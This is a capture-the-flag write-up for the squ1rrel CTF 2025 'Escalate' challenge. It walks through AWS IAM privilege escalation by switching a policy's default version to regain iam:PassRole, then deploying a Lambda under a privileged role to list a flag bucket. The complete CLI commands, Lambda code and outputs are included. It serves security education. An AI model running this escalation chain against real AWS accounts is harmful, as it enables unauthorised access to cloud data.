# Escalate (squ1rrel CTF 2025)

The objective of this challenge was to escalate privileges within an AWS environment and gain access to the s3 buckets. For guidance, I referred to [AWS IAM Privilege Escalation GitHub repository by RhinoSecurityLabs](https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation), specifically:

> **2. Setting the default policy version to an existing version**\
> &#xNAN;_&#x44;escription:_ An attacker with the `iam:SetDefaultPolicyVersion` permission may be able to escalate privileges through existing policy versions that are not currently in use. If a policy that they have access to has versions that are not the default, they would be able to change the default version to any other existing version.\
> &#xNAN;_&#x52;equired Permission(s):_ `iam:SetDefaultPolicyVersion`

In this challenge, I leveraged this technique to switch to a more permissive version of **UserPolicy**.

***

## Step‑1: Analyze the Environment

### List IAM Roles

I enumerated the roles in the account:

```cmd
aws iam list-roles
```

**Key Roles Identified:**

* AWSServiceRoleForOrganizations
* AWSServiceRoleForSSO
* AWSServiceRoleForSupport
* AWSServiceRoleForTrustedAdvisor
* MagicRole
* OrganizationAccountAccessRole

I reviewed the details of **MagicRole** (a likely pivot point) using:

```cmd
aws iam get-role --role-name MagicRole
```

**Output:**

```json
{
    "Role": {
        "Path": "/",
        "RoleName": "MagicRole",
        "RoleId": "AROATC4J3IHY7ZJ5YU43C",
        "Arn": "arn:aws:iam::212353106417:role/MagicRole",
        "CreateDate": "2025-04-05T04:04:31+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2025-04-06T05:24:56+00:00",
            "Region": "us-east-1"
        }
    }
}
```

But inspecting other roles also and trying to assume them did not work

{% code overflow="wrap" %}
```json
An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::212353106417:user/ctfuser is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::212353106417:role/MagicRole
```
{% endcode %}

### List S3 Buckets

Trying to see if we are directly allowed to access s3 buckets:

```
aws s3 ls
```

**Output:**

{% code overflow="wrap" %}
```json
An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:iam::212353106417:user/ctfuser is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
```
{% endcode %}

### List and Inspect IAM Policies

I listed the local policies to understand the permissions available:

```cmd
aws iam list-policies --scope Local
```

**Output:**

```json
{
    "Policies": [
        {
            "PolicyName": "UserPolicy",
            "PolicyId": "ANPATC4J3IHY6KCXS4AEM",
            "Arn": "arn:aws:iam::212353106417:policy/UserPolicy",
            "Path": "/",
            "DefaultVersionId": "v2",
            "AttachmentCount": 1,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "CreateDate": "2025-04-05T04:04:30+00:00",
            "UpdateDate": "2025-04-08T10:23:34+00:00"
        },
        {
            "PolicyName": "MagicPolicy",
            "PolicyId": "ANPATC4J3IHYQ3Z6PLVLX",
            "Arn": "arn:aws:iam::212353106417:policy/MagicPolicy",
            "Path": "/",
            "DefaultVersionId": "v1",
            "AttachmentCount": 1,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "CreateDate": "2025-04-05T04:04:31+00:00",
            "UpdateDate": "2025-04-05T04:04:31+00:00"
        }
    ]
}
```

The two policies of interest were **UserPolicy** and **MagicPolicy**.

#### UserPolicy Permissions

I inspected **UserPolicy** (default version v2):

```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::212353106417:policy/UserPolicy --version-id v2
```

**Output (v2):**

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:SetDefaultPolicyVersion",
                        "iam:ListRoles",
                        "iam:GetRole",
                        "iam:ListPolicies",
                        "iam:ListPolicyVersions",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:ListEntitiesForPolicy",
                        "lambda:GetFunction"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:CreateFunction",
                        "lambda:InvokeFunction",
                        "lambda:UpdateFunctionCode",
                        "lambda:UpdateFunctionConfiguration",
                        "lambda:DeleteFunction",
                        "lambda:ListFunctions"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2025-04-05T04:04:30+00:00"
    }
}
```

Then, I reviewed the inactive version **v1**:

```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::212353106417:policy/UserPolicy --version-id v1
```

**Output (v1):**

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:SetDefaultPolicyVersion",
                        "iam:ListRoles",
                        "iam:GetRole",
                        "iam:ListPolicies",
                        "iam:ListPolicyVersions",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetPolicy",
                        "iam:PassRole",
                        "iam:GetPolicyVersion",
                        "iam:ListEntitiesForPolicy",
                        "lambda:GetFunction"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:CreateFunction",
                        "lambda:InvokeFunction",
                        "lambda:UpdateFunctionCode",
                        "lambda:UpdateFunctionConfiguration",
                        "lambda:DeleteFunction",
                        "lambda:ListFunctions"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2025-04-05T04:04:30+00:00"
    }
}
```

_Analysis:_\
The key difference is that **v1** includes the **iam:PassRole** permission, which is critical for passing roles to Lambda functions.

#### MagicPolicy Permissions

I also reviewed **MagicPolicy**:

```cmd
aws iam get-policy-version --policy-arn arn:aws:iam::212353106417:policy/MagicPolicy --version-id v1
```

**Output:**

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "s3:ListBucket",
                    "Resource": "arn:aws:s3:::squ1rrel-ctf-flags"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "logs:CreateLogGroup",
                        "logs:CreateLogStream",
                        "logs:PutLogEvents"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-04-05T04:04:31+00:00"
    }
}
```

The policy explicitly grants the `s3:ListBucket` action on the bucket identified by the ARN:`arn:aws:s3:::squ1rrel-ctf-flags`. This indicates that we somehow need to access this bucket.

***

## Step‑2: Escalation via Default Policy Version Change

Given the presence of multiple policy versions and with the **iam:SetDefaultPolicyVersion** permission at our disposal, I applied the technique from the RhinoSecurityLabs article:

> **2. Setting the default policy version to an existing version**\
> &#xNAN;_&#x49;f a policy that they have access to has versions that are not the default, they can change the default version to any other existing version._

I switched **UserPolicy** to version **v1**:

```cmd
aws iam set-default-policy-version --policy-arn arn:aws:iam::212353106417:policy/UserPolicy --version-id v1
```

This action activated **v1**, granting me the **iam:PassRole** permission that was missing in the default version (**v2**).

***

## Step‑3: Leverage Lambda Permissions

### Check for Existing Lambda Functions

Before creating a new function, I checked if any Lambda functions already existed, as my permissions included various Lambda actions:

```cmd
aws lambda list-functions
```

**Output:**

```json
{
    "Functions": []
}
```

Since no pre-existing functions were found, I proceeded to create one.

### Create and Deploy a Lambda Function

1.  **Prepare Lambda Code:**\
    I created a file named `lambda_function.py` with the following content:

    ```python
    import boto3
    import json

    def lambda_handler(event, context):
        try:
            s3 = boto3.client('s3')
            response = s3.list_objects_v2(Bucket='squ1rrel-ctf-flags')
            return {
                "statusCode": 200,
                "body": json.dumps(response, default=str)
            }
        except Exception as e:
            print("Error:", str(e))
            return {
                "statusCode": 500,
                "body": json.dumps({"error": str(e)})
            }
    ```
2. **Package the Function:**\
   Then zip `lambda_function.py` into a ZIP file called `function.zip`
3.  **Create the Lambda Function Using MagicRole:**\
    With the new **iam:PassRole** permission, I created the function:

    ```cmd
    aws lambda create-function --function-name EscalateLambda --runtime python3.8 --role arn:aws:iam::212353106417:role/MagicRole --handler lambda_function.lambda_handler --zip-file fileb://function.zip
    ```

    **Output:**

    ```json
    {
        "FunctionName": "EscalateLambda",
        "FunctionArn": "arn:aws:lambda:us-east-1:212353106417:function:EscalateLambda",
        "Runtime": "python3.8",
        "Role": "arn:aws:iam::212353106417:role/MagicRole",
        ...
    }
    ```

***

## Step‑4: Invoke and Troubleshoot the Lambda Function

I invoked the Lambda function:

```cmd
aws lambda invoke --function-name EscalateLambda output.json
```

**Output:**

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

A `output.json` file was created and while viewing its contents:

{% code overflow="wrap" %}
```json
\"Contents\": [{\"Key\": \"squ1rrel{dont_you_love_aws}.txt\", \"LastModified\": \"2025-04-04 05:59:47+00:00\"
```
{% endcode %}

**Flag:** `squ1rrel{dont_you_love_aws}`
